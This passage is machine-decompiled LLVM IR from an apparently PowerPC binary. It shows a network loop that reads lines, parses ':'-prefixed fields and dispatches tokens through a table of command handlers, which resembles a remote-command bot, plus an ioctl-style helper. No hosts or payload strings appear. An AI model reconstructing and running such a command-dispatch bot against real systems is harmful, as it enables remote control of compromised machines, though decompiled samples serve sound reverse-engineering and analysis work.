  store i32 ptrtoint ([6 x i8]* @global_var_1000dcd8.175 to i32), i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_10004120.176 to i32), i32* @lr, align 4
  %v4_1000411c = call i32 @function_10007068(i32 %v2_100040f4, i32 ptrtoint ([6 x i8]* @global_var_1000dcd8.175 to i32), i32 %v0_10004104)
  %v2_1000418c48 = icmp sgt i32 %arg1, 1
  br i1 %v2_1000418c48, label %dec_label_pc_1000412c, label %dec_label_pc_10004194

dec_label_pc_1000412c:                            ; preds = %dec_label_pc_100040f0, %dec_label_pc_1000412c
  %storemerge1051 = phi i32 [ %v1_1000417c, %dec_label_pc_1000412c ], [ 1, %dec_label_pc_100040f0 ]
  %v1_10004130 = mul i32 %storemerge1051, 4
  %v2_1000413c = add i32 %v1_10004130, %tmp
  %v1_10004140 = inttoptr i32 %v2_1000413c to i32*
  %v2_10004140 = load i32, i32* %v1_10004140, align 4
  store i32 %v2_10004140, i32* @r3, align 4
  %v0_10004160 = call i32 @function_10006ed8()
  store i32 268452216, i32* @lr, align 4
  %v3_10004174 = call i32 @function_10006e28(i32 %v2_10004140, i32 0, i32 %v0_10004160)
  %v1_1000417c = add nuw nsw i32 %storemerge1051, 1
  %v2_1000418c = icmp slt i32 %v1_1000417c, %arg1
  br i1 %v2_1000418c, label %dec_label_pc_1000412c, label %dec_label_pc_10004194

dec_label_pc_10004194:                            ; preds = %dec_label_pc_1000412c, %dec_label_pc_100040f0
  store i32 268452252, i32* @lr, align 4
  %v1_10004198 = call i32 @function_10004a90(i32 0)
  store i32 268452260, i32* @lr, align 4
  %v0_100041a0 = call i32 @function_10004970()
  %v2_100041a8 = xor i32 %v1_10004198, %v0_100041a0
  store i32 268452272, i32* @lr, align 4
  %v0_100041ac = call i32 @function_100049b8()
  %v2_100041b4 = add i32 %v2_100041a8, %v0_100041ac
  store i32 268452288, i32* @lr, align 4
  %v1_100041bc = call i32 @function_100082d8(i32 %v2_100041b4)
  store i32 268452292, i32* @lr, align 4
  %v0_100041c0 = call i32 @function_100007d4()
  store i32 %v0_100041c0, i32* @global_var_10010474.145, align 4
  store i32 268452308, i32* @lr, align 4
  %v0_100041d0 = call i32 @function_100007d4()
  store i32 %v0_100041d0, i32* @global_var_10010470.19, align 4
  store i32 268452324, i32* @lr, align 4
  %v0_100041e0 = call i32 @function_100007d4()
  store i32 %v0_100041e0, i32* @global_var_1001047c.177, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1000dce0.178 to i32), i32* @global_var_10010488.143, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1000dce8.179 to i32), i32* @global_var_10010484.159, align 4
  store i32 0, i32* @global_var_10010480.106, align 4
  %v2_10004268 = ptrtoint i32* %stack_var_-6308 to i32
  %v2_100042c0 = ptrtoint i32* %stack_var_-6616 to i32
  %v2_100042c4 = add i32 %v2_100042c0, 308
  %v2_1000431c = ptrtoint i32* %stack_var_-6316 to i32
  %v2_10004530 = ptrtoint i32* %stack_var_-4132 to i32
  %v2_1000461c = ptrtoint i32* %stack_var_-5156 to i32
  %v2_100046c4 = ptrtoint i32* %stack_var_-6180 to i32
  %v2_10004564 = add i32 %v2_100042c0, 2484
  br label %dec_label_pc_10004220

dec_label_pc_10004220:                            ; preds = %dec_label_pc_10004528, %dec_label_pc_100042ac, %dec_label_pc_1000479c, %dec_label_pc_10004194
  store i32 268452388, i32* @lr, align 4
  %v0_10004220 = call i32 @function_10003dbc()
  %v3_10004228 = load i32, i32* @global_var_10010478.10, align 4
  %v3_10004230 = load i32, i32* @global_var_10010474.145, align 4
  %v3_10004238 = load i32, i32* @global_var_10010470.19, align 4
  %v7_10004260 = call i32 @function_1000041c(i32 %v3_10004228, i32 ptrtoint ([41 x i8]* @global_var_1000dcf0.180 to i32), i32 %v3_10004230, i32 %v3_10004238)
  br label %dec_label_pc_10004268

dec_label_pc_10004268:                            ; preds = %dec_label_pc_100044e8, %dec_label_pc_1000455c, %dec_label_pc_100047bc, %dec_label_pc_100047e0, %dec_label_pc_10004220
  br label %dec_label_pc_1000427c

dec_label_pc_1000427c:                            ; preds = %dec_label_pc_10004268, %dec_label_pc_1000427c
  %storemerge1123 = phi i32 [ 0, %dec_label_pc_10004268 ], [ %v1_10004298, %dec_label_pc_1000427c ]
  %v1_10004284 = mul nuw nsw i32 %storemerge1123, 4
  %v2_10004288 = add i32 %v1_10004284, %v2_10004268
  %v2_10004290 = inttoptr i32 %v2_10004288 to i32*
  store i32 0, i32* %v2_10004290, align 4
  %v1_10004298 = add nuw nsw i32 %storemerge1123, 1
  %tmp73 = icmp ult i32 %v1_10004298, 32
  br i1 %tmp73, label %dec_label_pc_1000427c, label %dec_label_pc_100042ac

dec_label_pc_100042ac:                            ; preds = %dec_label_pc_1000427c
  %v3_100042b0 = load i32, i32* @global_var_10010478.10, align 4
  %v1_100042b4 = udiv i32 %v3_100042b0, 32
  %v1_100042bc = mul nuw nsw i32 %v1_100042b4, 4
  %v1_100042c8 = add i32 %v1_100042bc, %v2_100042c4
  %v1_100042cc = inttoptr i32 %v1_100042c8 to i32*
  %v2_100042cc = load i32, i32* %v1_100042cc, align 4
  %v1_100042d8 = urem i32 %v3_100042b0, 32
  %v3_100042e0 = shl i32 1, %v1_100042d8
  %v2_100042e4 = or i32 %v2_100042cc, %v3_100042e0
  store i32 %v2_100042e4, i32* %v1_100042cc, align 4
  store i32 1200, i32* %stack_var_-6316, align 4
  %v3_10004310 = load i32, i32* @global_var_10010478.10, align 4
  %v1_10004314 = add i32 %v3_10004310, 1
  store i32 268452664, i32* @lr, align 4
  %v6_10004334 = call i32 @function_10004a48(i32 %v1_10004314, i32 %v2_10004268, i32 0, i32 0, i32 %v2_1000431c, i32 %v2_10004268)
  %tmp74 = icmp slt i32 %v6_10004334, 1
  br i1 %tmp74, label %dec_label_pc_10004220, label %dec_label_pc_100044d4.preheader

dec_label_pc_100044d4.preheader:                  ; preds = %dec_label_pc_100042ac
  %v3_100044d828 = load i32, i32* @global_var_10010468.13, align 4
  %v2_100044e029 = icmp eq i32 %v3_100044d828, 0
  br i1 %v2_100044e029, label %dec_label_pc_100044e8, label %dec_label_pc_10004350

dec_label_pc_10004350:                            ; preds = %dec_label_pc_100044d4.preheader, %dec_label_pc_100044c8
  %storemerge1231 = phi i32 [ %.pre, %dec_label_pc_100044c8 ], [ 0, %dec_label_pc_100044d4.preheader ]
  %v1_10004354 = mul i32 %storemerge1231, 4
  %v3_10004360 = load i32, i32* @global_var_1001048c.14, align 4
  %v2_10004364 = add i32 %v3_10004360, %v1_10004354
  %v1_10004368 = inttoptr i32 %v2_10004364 to i32*
  %v2_10004368 = load i32, i32* %v1_10004368, align 4
  store i32 268452732, i32* @lr, align 4
  %v3_10004378 = call i32 @function_10004ad8(i32 %v2_10004368, i32 0, i32 1)
  %tmp75 = icmp slt i32 %v3_10004378, 1
  %.pre = add i32 %storemerge1231, 1
  br i1 %tmp75, label %dec_label_pc_100044c8, label %dec_label_pc_100043e0.preheader

dec_label_pc_100043e0.preheader:                  ; preds = %dec_label_pc_10004350
  %v3_100043e479 = load i32, i32* @global_var_10010468.13, align 4
  %v2_100043ec80 = icmp ult i32 %.pre, %v3_100043e479
  %v1_1000439c81 = mul i32 %.pre, 4
  %v3_100043a882 = load i32, i32* @global_var_1001048c.14, align 4
  %v2_100043ac83 = add i32 %v3_100043a882, %v1_1000439c81
  br i1 %v2_100043ec80, label %dec_label_pc_10004398, label %dec_label_pc_100043f4

dec_label_pc_10004398:                            ; preds = %dec_label_pc_100043e0.preheader, %dec_label_pc_10004398
  %v2_100043ac87 = phi i32 [ %v2_100043ac, %dec_label_pc_10004398 ], [ %v2_100043ac83, %dec_label_pc_100043e0.preheader ]
  %v1_1000438c84 = phi i32 [ %v1_1000438c, %dec_label_pc_10004398 ], [ %.pre, %dec_label_pc_100043e0.preheader ]
  %v1_100043b0 = add i32 %v2_100043ac87, -4
  %v1_100043cc = inttoptr i32 %v2_100043ac87 to i32*
  %v2_100043cc = load i32, i32* %v1_100043cc, align 4
  %v2_100043d0 = inttoptr i32 %v1_100043b0 to i32*
  store i32 %v2_100043cc, i32* %v2_100043d0, align 4
  %v1_1000438c = add i32 %v1_1000438c84, 1
  %v3_100043e4 = load i32, i32* @global_var_10010468.13, align 4
  %v2_100043ec = icmp ult i32 %v1_1000438c, %v3_100043e4
  %v1_1000439c = mul i32 %v1_1000438c, 4
  %v3_100043a8 = load i32, i32* @global_var_1001048c.14, align 4
  %v2_100043ac = add i32 %v3_100043a8, %v1_1000439c
  br i1 %v2_100043ec, label %dec_label_pc_10004398, label %dec_label_pc_100043f4

dec_label_pc_100043f4:                            ; preds = %dec_label_pc_10004398, %dec_label_pc_100043e0.preheader
  %v2_100043ac.lcssa = phi i32 [ %v2_100043ac83, %dec_label_pc_100043e0.preheader ], [ %v2_100043ac, %dec_label_pc_10004398 ]
  %v1_1000440c = add i32 %v2_100043ac.lcssa, -4
  %v2_10004414 = inttoptr i32 %v1_1000440c to i32*
  store i32 0, i32* %v2_10004414, align 4
  %v3_1000441c = load i32, i32* @global_var_10010468.13, align 4
  %v1_10004420 = add i32 %v3_1000441c, -1
  store i32 %v1_10004420, i32* @global_var_10010468.13, align 4
  %v1_10004434 = mul i32 %v1_10004420, 4
  %v1_10004438 = add i32 %v1_10004434, 4
  store i32 268452932, i32* @lr, align 4
  %v1_10004440 = call i32 @function_10007cf0(i32 %v1_10004438)
  %v3_1000449c24 = load i32, i32* @global_var_10010468.13, align 4
  %v2_100044a425 = icmp eq i32 %v3_1000449c24, 0
  br i1 %v2_100044a425, label %dec_label_pc_100044ac, label %dec_label_pc_10004458

dec_label_pc_10004458:                            ; preds = %dec_label_pc_100043f4, %dec_label_pc_10004458
  %storemerge1927 = phi i32 [ %v1_10004490, %dec_label_pc_10004458 ], [ 0, %dec_label_pc_100043f4 ]
  %v1_1000445c = mul i32 %storemerge1927, 4
  %v2_10004468 = add i32 %v1_1000445c, %v1_10004440
  %v3_1000447c = load i32, i32* @global_var_1001048c.14, align 4
  %v2_10004480 = add i32 %v3_1000447c, %v1_1000445c
  %v1_10004484 = inttoptr i32 %v2_10004480 to i32*
  %v2_10004484 = load i32, i32* %v1_10004484, align 4
  %v2_10004488 = inttoptr i32 %v2_10004468 to i32*
  store i32 %v2_10004484, i32* %v2_10004488, align 4
  %v1_10004490 = add i32 %storemerge1927, 1
  %v3_1000449c = load i32, i32* @global_var_10010468.13, align 4
  %v2_100044a4 = icmp ult i32 %v1_10004490, %v3_1000449c
  br i1 %v2_100044a4, label %dec_label_pc_10004458, label %dec_label_pc_10004498.dec_label_pc_100044ac_crit_edge

dec_label_pc_10004498.dec_label_pc_100044ac_crit_edge: ; preds = %dec_label_pc_10004458
  br label %dec_label_pc_100044ac

dec_label_pc_100044ac:                            ; preds = %dec_label_pc_100043f4, %dec_label_pc_10004498.dec_label_pc_100044ac_crit_edge
  %v3_100044b0 = load i32, i32* @global_var_1001048c.14, align 4
  store i32 268453052, i32* @lr, align 4
  %v1_100044b8 = call i32 @function_10007e48(i32 %v3_100044b0)
  store i32 %v1_10004440, i32* @global_var_1001048c.14, align 4
  br label %dec_label_pc_100044c8

dec_label_pc_100044c8:                            ; preds = %dec_label_pc_10004350, %dec_label_pc_100044ac
  %v3_100044d8 = load i32, i32* @global_var_10010468.13, align 4
  %v2_100044e0 = icmp ult i32 %.pre, %v3_100044d8
  br i1 %v2_100044e0, label %dec_label_pc_10004350, label %dec_label_pc_100044e8

dec_label_pc_100044e8:                            ; preds = %dec_label_pc_100044d4.preheader, %dec_label_pc_100044c8
  %v3_100044ec = load i32, i32* @global_var_10010478.10, align 4
  %v1_100044f0 = udiv i32 %v3_100044ec, 32
  %v1_100044f4 = mul nuw nsw i32 %v1_100044f0, 4
  %v1_10004500 = add i32 %v1_100044f4, %v2_100042c4
  %v1_10004504 = inttoptr i32 %v1_10004500 to i32*
  %v2_10004504 = load i32, i32* %v1_10004504, align 4
  %v1_10004510 = urem i32 %v3_100044ec, 32
  %v3_10004514 = sub i32 0, %v3_100044ec
  %v4_10004514 = urem i32 %v3_10004514, 32
  %v5_10004514 = shl i32 %v2_10004504, %v4_10004514
  %v6_10004514 = xor i32 %v4_10004514, 31
  %v7_10004514 = lshr i32 %v2_10004504, %v6_10004514
  %v8_10004514 = udiv i32 %v7_10004514, 2
  %v9_10004514 = or i32 %v8_10004514, %v5_10004514
  %v12_10004514 = lshr i32 -1, %v1_10004510
  %tmp100 = icmp slt i32 %v2_10004504, 0
  %v15_1000451420 = zext i1 %tmp100 to i32
  %v16_10004514 = xor i32 %v12_10004514, 1
  %v17_10004514 = and i32 %v15_1000451420, %v16_10004514
  %v14_10004514 = urem i32 %v12_10004514, 2
  %v14_10004514.masked = and i32 %v14_10004514, %v9_10004514
  %v1_1000451c = or i32 %v14_10004514.masked, %v17_10004514
  %v3_10004520 = icmp eq i32 %v1_1000451c, 0
  br i1 %v3_10004520, label %dec_label_pc_10004268, label %dec_label_pc_10004528

dec_label_pc_10004528:                            ; preds = %dec_label_pc_100044e8
  store i32 268453192, i32* @lr, align 4
  %v4_10004544 = call i32 @function_10007c08(i32 %v3_100044ec, i32 %v2_10004530, i32 4096, i32 0)
  store i32 %v4_10004544, i32* %stack_var_-6616, align 4
  %tmp76 = icmp slt i32 %v4_10004544, 1
  br i1 %tmp76, label %dec_label_pc_10004220, label %dec_label_pc_1000455c

dec_label_pc_1000455c:                            ; preds = %dec_label_pc_10004528
  %v3_1000456c = add i32 %v2_10004564, %v4_10004544
  %v4_1000456c = inttoptr i32 %v3_1000456c to i8*
  store i8 0, i8* %v4_1000456c, align 1
  store i32 ptrtoint (i32* @global_var_1000dd1c.182 to i32), i32* @r4, align 4
  store i32 268453252, i32* @lr, align 4
  %v3_10004580 = call i32 @function_10007400(i32 %v2_10004530, i32 ptrtoint (i32* @global_var_1000dd1c.182 to i32), i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v3_100047d845 = icmp eq i32 %v3_10004580, 0
  br i1 %v3_100047d845, label %dec_label_pc_10004268, label %dec_label_pc_100047e0

dec_label_pc_10004590:                            ; preds = %dec_label_pc_100047e0
  store i32 268453272, i32* @lr, align 4
  %v2_10004594 = call i32 @function_10000724(i32 %storemerge47.in)
  %v2_1000459c = load i8, i8* %storemerge47, align 1
  %v3_100045a4 = icmp eq i8 %v2_1000459c, 58
  br i1 %v3_100045a4, label %dec_label_pc_100045c4.preheader, label %dec_label_pc_10004650

dec_label_pc_100045c4.preheader:                  ; preds = %dec_label_pc_10004590
  store i32 0, i32* %stack_var_-6616, align 4
  store i32 %storemerge47.in, i32* @r3, align 4
  %v0_100045cc32 = call i32 @function_10006ed8()
  %v2_100045d434 = icmp eq i32 %v0_100045cc32, 0
  br i1 %v2_100045d434, label %dec_label_pc_100045fc, label %dec_label_pc_100045dc

dec_label_pc_100045b8:                            ; preds = %dec_label_pc_100045dc
  %v1_100045bc = add i32 %v3_100045dc, 1
  store i32 %v1_100045bc, i32* %stack_var_-6616, align 4
  store i32 %storemerge47.in, i32* @r3, align 4
  %v0_100045cc = call i32 @function_10006ed8()
  %v2_100045d4 = icmp ult i32 %v1_100045bc, %v0_100045cc
  br i1 %v2_100045d4, label %dec_label_pc_100045dc, label %dec_label_pc_100045fc

dec_label_pc_100045dc:                            ; preds = %dec_label_pc_100045c4.preheader, %dec_label_pc_100045b8
  %v3_100045dc = load i32, i32* %stack_var_-6616, align 4
  %v2_100045e8 = add i32 %v3_100045dc, %storemerge47.in
  %v1_100045ec = inttoptr i32 %v2_100045e8 to i8*
  %v2_100045ec = load i8, i8* %v1_100045ec, align 1
  %v3_100045f4 = icmp eq i8 %v2_100045ec, 32
  br i1 %v3_100045f4, label %dec_label_pc_100045fc, label %dec_label_pc_100045b8

dec_label_pc_100045fc:                            ; preds = %dec_label_pc_100045c4.preheader, %dec_label_pc_100045b8, %dec_label_pc_100045dc
  %v3_100045fc = load i32, i32* %stack_var_-6616, align 4
  %v2_10004608 = add i32 %v3_100045fc, %storemerge47.in
  %v3_10004610 = inttoptr i32 %v2_10004608 to i8*
  store i8 0, i8* %v3_10004610, align 1
  %v1_10004618 = add i32 %storemerge47.in, 1
  %v2_10004628 = inttoptr i32 %v1_10004618 to i8*
  %v3_10004628 = call i32 @function_10006eb8(i32 %v2_1000461c, i8* %v2_10004628)
  %v3_1000462c = load i32, i32* %stack_var_-6616, align 4
  %v2_10004638 = add i32 %v3_1000462c, %storemerge47.in
  %v1_1000463c = add i32 %v2_10004638, 1
  %v3_10004648 = inttoptr i32 %v1_1000463c to i8*
  %v4_10004648 = call i32 @function_10006eb8(i32 %storemerge47.in, i8* %v3_10004648)
  br label %dec_label_pc_10004674.preheader

dec_label_pc_10004650:                            ; preds = %dec_label_pc_10004590
  store i32 10752, i32* %stack_var_-5156, align 4
  br label %dec_label_pc_10004674.preheader

dec_label_pc_10004674.preheader:                  ; preds = %dec_label_pc_100045fc, %dec_label_pc_10004650
  store i32 0, i32* %stack_var_-6616, align 4
  store i32 %storemerge47.in, i32* @r3, align 4
  %v0_1000467c37 = call i32 @function_10006ed8()
  %v2_1000468439 = icmp eq i32 %v0_1000467c37, 0
  br i1 %v2_1000468439, label %dec_label_pc_100046ac, label %dec_label_pc_1000468c

dec_label_pc_10004668:                            ; preds = %dec_label_pc_1000468c
  %v1_1000466c = add i32 %v3_1000468c, 1
  store i32 %v1_1000466c, i32* %stack_var_-6616, align 4
  store i32 %storemerge47.in, i32* @r3, align 4
  %v0_1000467c = call i32 @function_10006ed8()
  %v2_10004684 = icmp ult i32 %v1_1000466c, %v0_1000467c
  br i1 %v2_10004684, label %dec_label_pc_1000468c, label %dec_label_pc_100046ac

dec_label_pc_1000468c:                            ; preds = %dec_label_pc_10004674.preheader, %dec_label_pc_10004668
  %v3_1000468c = load i32, i32* %stack_var_-6616, align 4
  %v2_10004698 = add i32 %v3_1000468c, %storemerge47.in
  %v1_1000469c = inttoptr i32 %v2_10004698 to i8*
  %v2_1000469c = load i8, i8* %v1_1000469c, align 1
  %v3_100046a4 = icmp eq i8 %v2_1000469c, 32
  br i1 %v3_100046a4, label %dec_label_pc_100046ac, label %dec_label_pc_10004668

dec_label_pc_100046ac:                            ; preds = %dec_label_pc_10004674.preheader, %dec_label_pc_10004668, %dec_label_pc_1000468c
  %v3_100046ac = load i32, i32* %stack_var_-6616, align 4
  %v2_100046b8 = add i32 %v3_100046ac, %storemerge47.in
  %v3_100046c0 = inttoptr i32 %v2_100046b8 to i8*
  store i8 0, i8* %v3_100046c0, align 1
  %v4_100046d0 = call i32 @function_10006eb8(i32 %v2_100046c4, i8* %storemerge47)
  %v3_100046d4 = load i32, i32* %stack_var_-6616, align 4
  %v2_100046e0 = add i32 %v3_100046d4, %storemerge47.in
  %v1_100046e4 = add i32 %v2_100046e0, 1
  %v3_100046f0 = inttoptr i32 %v1_100046e4 to i8*
  %v4_100046f0 = call i32 @function_10006eb8(i32 %storemerge47.in, i8* %v3_100046f0)
  store i32 0, i32* %stack_var_-6616, align 4
  %v2_1000479090 = load i32, i32* bitcast ([4 x i8]** @global_var_100100a4.186 to i32*), align 4
  %v3_1000479493 = icmp eq i32 %v2_1000479090, 0
  br i1 %v3_1000479493, label %dec_label_pc_1000479c, label %dec_label_pc_10004700

dec_label_pc_10004700:                            ; preds = %dec_label_pc_100046ac, %dec_label_pc_10004700
  %v1_1000479096 = phi i32* [ %v1_10004790, %dec_label_pc_10004700 ], [ bitcast ([4 x i8]** @global_var_100100a4.186 to i32*), %dec_label_pc_100046ac ]
  %v2_10004714 = load i32, i32* %v1_1000479096, align 4
  store i32 %v2_10004714, i32* @r3, align 4
  store i32 %v2_100046c4, i32* @r4, align 4
  %v2_10004724 = call i32 @function_10007360(i32 %v2_10004714, i32 %v2_100046c4)
  %v3_10004734 = load i32, i32* %stack_var_-6616, align 4
  %v1_10004740 = mul i32 %v3_10004734, 8
  %v1_10004748 = add i32 %v1_10004740, add (i32 ptrtoint ([4 x i8]** @global_var_100100a4.186 to i32), i32 4)
  %v1_1000474c = inttoptr i32 %v1_10004748 to i32*
  %v2_1000474c = load i32, i32* %v1_1000474c, align 4
  call void @__pseudo_call(i32 %v2_1000474c)
  %v3_10004770 = load i32, i32* %stack_var_-6616, align 4
  %v1_10004774 = add i32 %v3_10004770, 1
  store i32 %v1_10004774, i32* %stack_var_-6616, align 4
  %v1_10004788 = mul i32 %v1_10004774, 8
  %v2_1000478c = add i32 %v1_10004788, ptrtoint ([4 x i8]** @global_var_100100a4.186 to i32)
  %v1_10004790 = inttoptr i32 %v2_1000478c to i32*
  %v2_10004790 = load i32, i32* %v1_10004790, align 4
  %v3_10004794 = icmp eq i32 %v2_10004790, 0
  br i1 %v3_10004794, label %dec_label_pc_1000479c, label %dec_label_pc_10004700

dec_label_pc_1000479c:                            ; preds = %dec_label_pc_10004700, %dec_label_pc_100046ac
  store i32 %v2_100046c4, i32* @r3, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1000dd20.187 to i32), i32* @r4, align 4
  %v3_100047ac = call i32 @function_10007360(i32 %v2_100046c4, i32 ptrtoint ([6 x i8]* @global_var_1000dd20.187 to i32))
  %v3_100047b4 = icmp eq i32 %v3_100047ac, 0
  br i1 %v3_100047b4, label %dec_label_pc_10004220, label %dec_label_pc_100047bc

dec_label_pc_100047bc:                            ; preds = %dec_label_pc_1000479c
  store i32 ptrtoint (i32* @global_var_1000dd1c.182 to i32), i32* @r4, align 4
  store i32 268453836, i32* @lr, align 4
  %v3_100047c8 = call i32 @function_10007400(i32 0, i32 ptrtoint (i32* @global_var_1000dd1c.182 to i32), i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v3_100047d8 = icmp eq i32 %v3_100047c8, 0
  br i1 %v3_100047d8, label %dec_label_pc_10004268, label %dec_label_pc_100047e0

dec_label_pc_100047e0:                            ; preds = %dec_label_pc_1000455c, %dec_label_pc_100047bc
  %storemerge47.in = phi i32 [ %v3_100047c8, %dec_label_pc_100047bc ], [ %v3_10004580, %dec_label_pc_1000455c ]
  %storemerge47 = inttoptr i32 %storemerge47.in to i8*
  %v2_100047e4 = load i8, i8* %storemerge47, align 1
  %v3_100047ec = icmp eq i8 %v2_100047e4, 0
  br i1 %v3_100047ec, label %dec_label_pc_10004268, label %dec_label_pc_10004590

; uselistorder directives
  uselistorder i8* %storemerge47, { 2, 1, 0 }
  uselistorder i32 %storemerge47.in, { 14, 13, 7, 10, 5, 4, 9, 3, 8, 6, 12, 2, 1, 0, 11 }
  uselistorder i32* %v1_10004790, { 1, 0 }
  uselistorder i32 %v4_10004514, { 1, 0 }
  uselistorder i32 %v2_10004504, { 0, 2, 1 }
  uselistorder i32 %v3_100044ec, { 2, 3, 1, 0 }
  uselistorder i32 %v1_10004490, { 1, 0 }
  uselistorder i32 %v1_1000445c, { 1, 0 }
  uselistorder i32 %storemerge1927, { 1, 0 }
  uselistorder i32 %v1_10004440, { 1, 0 }
  uselistorder i32 %v1_1000438c, { 0, 2, 1 }
  uselistorder i32 %v2_100043ac87, { 1, 0 }
  uselistorder i32 %.pre, { 2, 4, 0, 3, 1 }
  uselistorder i32 %storemerge1231, { 1, 0 }
  uselistorder i32 %v3_100042b0, { 1, 0 }
  uselistorder i32 %storemerge1123, { 1, 0 }
  uselistorder i32 %v2_100046c4, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_10004268, { 2, 1, 0 }
  uselistorder i32 %v1_1000417c, { 1, 0 }
  uselistorder i32 %v2_10004140, { 1, 0 }
  uselistorder i32 %storemerge1051, { 1, 0 }
  uselistorder i32* %stack_var_-6616, { 5, 6, 7, 0, 8, 9, 10, 4, 1, 11, 12, 13, 3, 2, 14, 15 }
  uselistorder i32 ptrtoint ([4 x i8]** @global_var_100100a4.186 to i32), { 1, 0 }
  uselistorder [4 x i8]** @global_var_100100a4.186, { 1, 0 }
  uselistorder i32 (i32)* @function_10000724, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1000dd1c.182 to i32), { 0, 2, 1, 3 }
  uselistorder i32* @global_var_1001048c.14, { 1, 2, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder i32* @global_var_10010468.13, { 4, 5, 2, 6, 7, 8, 0, 1, 9, 3, 10, 11 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @function_10004a48, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_1000041c, { 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 1, 0, 10, 9, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 ()* @function_100007d4, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @function_100082d8, { 1, 0 }
  uselistorder i32 (i32)* @function_10004a90, { 10, 9, 0, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 ()* @function_10004928, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_100047e0, { 1, 0 }
  uselistorder label %dec_label_pc_10004700, { 1, 0 }
  uselistorder label %dec_label_pc_100046ac, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000468c, { 1, 0 }
  uselistorder label %dec_label_pc_10004674.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_100045fc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100045dc, { 1, 0 }
  uselistorder label %dec_label_pc_100044e8, { 1, 0 }
  uselistorder label %dec_label_pc_100044c8, { 1, 0 }
  uselistorder label %dec_label_pc_100044ac, { 1, 0 }
  uselistorder label %dec_label_pc_10004458, { 1, 0 }
  uselistorder label %dec_label_pc_10004398, { 1, 0 }
  uselistorder label %dec_label_pc_10004350, { 1, 0 }
  uselistorder label %dec_label_pc_1000427c, { 1, 0 }
  uselistorder label %dec_label_pc_10004268, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_10004220, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1000412c, { 1, 0 }
  uselistorder label %dec_label_pc_100040f0, { 1, 0 }
}

define i32 @function_100047f8(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_100047f8:
  %r31.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg1, i32* @r3, align 4
  %stack_var_-32 = alloca i32, align 4
  %v4_10004808 = icmp eq i32 %arg2, -2143521772
  %v2_1000481c = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_1000481c, i32* %stack_var_-32, align 4
  br i1 %v4_10004808, label %dec_label_pc_1000487c, label %dec_label_pc_1000483c

dec_label_pc_1000483c:                            ; preds = %dec_label_pc_100047f8
  %v3_1000483c = icmp ugt i32 %arg2, -2143521772
  br i1 %v3_1000483c, label %dec_label_pc_10004854, label %dec_label_pc_10004844

dec_label_pc_10004844:                            ; preds = %dec_label_pc_1000483c
  %v3_10004848 = icmp eq i32 %arg2, 1077703699
  br i1 %v3_10004848, label %dec_label_pc_10004870, label %dec_label_pc_1000489c

dec_label_pc_10004854:                            ; preds = %dec_label_pc_1000483c
  %v1_10004854 = xor i32 %arg2, -2143551488
  %v3_10004858 = icmp eq i32 %v1_10004854, 29717
  br i1 %v3_10004858, label %dec_label_pc_1000488c, label %dec_label_pc_10004860

dec_label_pc_10004860:                            ; preds = %dec_label_pc_10004854
  %v3_10004864 = icmp eq i32 %v1_10004854, 29718
  br i1 %v3_10004864, label %dec_label_pc_10004894, label %dec_label_pc_1000489c

dec_label_pc_10004870:                            ; preds = %dec_label_pc_10004844
  store i32 ptrtoint (i32* @global_var_10004878.188 to i32), i32* @lr, align 4
  %v1_10004874 = inttoptr i32 %arg3 to i32*
  %v2_10004874 = call i32 @function_10007438(i32* %v1_10004874)
  br label %dec_label_pc_10004884

dec_label_pc_1000487c:                            ; preds = %dec_label_pc_100047f8
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_10004880

dec_label_pc_10004880:                            ; preds = %dec_label_pc_10004894, %dec_label_pc_1000488c, %dec_label_pc_1000487c
  store i32 268454020, i32* @lr, align 4
  %v0_10004880 = call i32 @function_100074d4()
  br label %dec_label_pc_10004884

dec_label_pc_10004884:                            ; preds = %dec_label_pc_10004870, %dec_label_pc_10004880
  %storemerge = phi i32 [ %v0_10004880, %dec_label_pc_10004880 ], [ %v2_10004874, %dec_label_pc_10004870 ]
  store i32 %storemerge, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100048c8

dec_label_pc_1000488c:                            ; preds = %dec_label_pc_10004854
  store i32 1, i32* @r4, align 4
  br label %dec_label_pc_10004880

dec_label_pc_10004894:                            ; preds = %dec_label_pc_10004860
  store i32 2, i32* @r4, align 4
  br label %dec_label_pc_10004880

dec_label_pc_1000489c:                            ; preds = %dec_label_pc_10004860, %dec_label_pc_10004844
  %v0_100048ac = call i32 @__asm_mfcr()
  %v1_100048b0 = and i32 %v0_100048ac, 268435456
  %v3_100048b0 = icmp eq i32 %v1_100048b0, 0
  store i32 %v0_100048ac, i32* %r31.global-to-local, align 4
  br i1 %v3_100048b0, label %dec_label_pc_100048c8, label %dec_label_pc_100048bc

dec_label_pc_100048bc:                            ; preds = %dec_label_pc_1000489c
  %v0_100048bc = call i32 @function_10004b48()
  %v0_100048c0 = load i32, i32* %r31.global-to-local, align 4
  %v2_100048c0 = inttoptr i32 %v0_100048bc to i32*
  store i32 %v0_100048c0, i32* %v2_100048c0, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100048c8

